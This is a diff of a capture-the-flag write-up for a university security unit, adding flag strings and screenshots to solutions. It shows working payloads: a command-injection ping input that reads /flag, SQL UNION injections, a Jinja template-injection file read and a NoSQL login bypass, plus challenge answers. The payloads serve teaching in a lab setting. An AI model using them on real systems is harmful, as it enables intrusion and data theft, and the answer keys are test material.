@@ -23,6 +23,7 @@ Observe the following HTML code on the challenge:
 
 Remove the `disabled` attribute on the `submit` button, and you can submit with any old email.
 
+![Flag: `CTF{n3v3R_tRv5t_d3_cL1eNt5_111!11}`](images/i-want-to-join.png)
 ## Ping of Death (15 points)
 
 > Some kid joined my Minecraft server and threatened that they were going to DDoS me using this dodgy website. In the end they just pinged my server, but I am 99% certain you can do a lot more with that website.
@@ -33,6 +34,7 @@ The "ping of death" likely refers to the skiddie technique of pinging a server t
 
 Specify the input `-n 1 8.8.8.8; cat /flag`. This will result in `ping -n 1 8.8.8.8; cat /flag` being executed.
 
+![Flag: `CTF{sCr1pTI3_k1Ddie5_c4nN0t_pR0gRaM_aNyThIng!!11one!}`](images/ping-of-death.png)
 ## cssubmit v2.0 (15 points)
 
 > The UWA Computer Science Department recentally hired a team of CITS3200 students to build the new CSSubmit v2.0 website to replace the old CSSubmit website. However, the students were unable to complete the platform by the end of the unit, so it is still in **development** and still has **registrations disabled**.
@@ -72,11 +74,15 @@ After logging in, retrieve the schema for the `flag` table, by specifying this i
 ' UNION SELECT (SELECT sql FROM sqlite_master WHERE name = 'flag'), 2, 3; --
 ```
 
-After observing the `flag` column in the `flag` table, construct a subquery to select it:
+![SQL: `CREATE TABLE "flag" ( "id" INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, "flag" VARCHAR)`](images/my-first-php-1.png)
+
+After observing the `flag` column in the `flag` table, inject a subquery to retrieve it:
 
 ```
 ' UNION SELECT (SELECT flag FROM flag), 2, 3; --
 ```
+
+![SQL: `CTF{i_5h0uLd_pRoBs_l3aRn_aBoUt_pRePaRed_qU3ri3s...}`](images/my-first-php-2.png)
 
 ## Web Ninja (15 points)
 
@@ -98,6 +104,8 @@ Email verification is done only on client-side.
 
 Remove the attribute `type="email"`, and input `{{ request['application']['__globals__']['__builtins__']['open']('/flag').read() }}`.
 
+![SQL: `CTF{tH3s3_n1Nj4s_aR3_h3cK1nG_mY_jInjA_t3MpLatEs!!one!}`](images/my-first-php-2.png)
+
 ## No SQL Injection 1 (15 points)
 > I have heard all about the issues that SQL injection attacks can cause.
 > 
@@ -117,6 +125,8 @@ Execute this in the console.
 ```js
 loginForm.username = loginForm.password = {"$ne": null};
 ```
+
+![SQL: `CTF{w41t_y0u_c4n_iNj3cT_nO_sQlI_dB5_2???!??}`](images/no-sql-injection-1.png)
 
 ## No SQL Injection 2 (20 points)
 
@@ -220,6 +230,8 @@ key = SHA256.new(long_to_bytes(shared)).digest()
 print(unpad(AES.new(key, AES.MODE_CBC, b"\0" * 16).decrypt(open("encrypted_msg.bin", "rb").read()), 256))
 ```
 
+Flag: `CTF{g1mMe_4_j1fFie_t0_d3cRyPt_tH15_d1fFi3!}`
+
 ## Brain XOR Brawn (15 points)
 
 > Can you recover the original plaintext that was encrypted using the XOR stream cipher with a key that is **8 bytes long**? The ciphertext is encoded as hex values and the plaintext starts as **CITS3004{ ... }**.
@@ -244,7 +256,7 @@ b'CITS3004{c1pH3rT3xT_pL41nT3xT_4tt4CK_1nC0mInG!!1!!}'
 > **Can you still see the hidden message within the image?**
 
 ECB can reveal repeating patterns in raw data. As PCM is just raw RGB values, we can just view it as raw image data in GIMP with the speficified dimensions.
-
+![Flag: `CTF{ECB IS REALLY BAD TO ENCRYPT IMAGES}`](images/ecbrypted.png)
 ## Rocking With The Cats (15 points)
 
 > Man some of these cats go absolutely wild! Last Saturday, I went to a house party where I saw some feral feline screaming out their password hash to the tune of **We Will Rock You** by Queen. I tried telling them that it is a pretty dumb idea to leak their hashed password to everyone, but they insisted it was fine since their password was **32 characters long** and it cannot be brute forced.
@@ -340,7 +352,7 @@ Flag: `russia:protonvpn:5.8.16.238`
 
 Scrolling through captures with the filter `ip.addr == 5.8.16.237 and http.response.code != 404` reveals a successful 301 repsonse to `/secure`. Following this request indicates that it is the DVWA.
 
-Flag: `/secure`
+![Flag: `/secure`](images/task-2.png)
 
 ## Task 3: Such Bad Creds (10 points)
 
@@ -363,7 +375,7 @@ Flag: `admin:password`
 Using the previous filter, we can observe the attacker sending a POST to `/secure/vulnerabilities/upload`.
 Within the POST body, we can see form-data containing a file with MIME type `application/x-php` with the filename `webshell.php`.
 
-Flag: `webshell.php`
+![Flag: `webshell.php`](images/task-3.png)
 
 ## Task 5: That File Looks Even Worse (10 points)
 
@@ -392,9 +404,9 @@ Flag: `42069`
 > 
 > Analysing the TCP packets of the bind shell, **what is the name of the user on the Windows server that the adversary compromised?**
 
-We can follow the TCP stream from the packet found at Task 7, using the shortcut `Ctrl+Alt+Shift+T` with the packet selected.
+We can follow the TCP stream from the packet found at Task 6, using the shortcut `Ctrl+Alt+Shift+T` with the packet selected.
 
-Flag: `nt authority/system`
+![Flag: `nt authority/system`](images/task-8.png)
 
 ## Task 8: A Present From The Hacker (15 points)
 
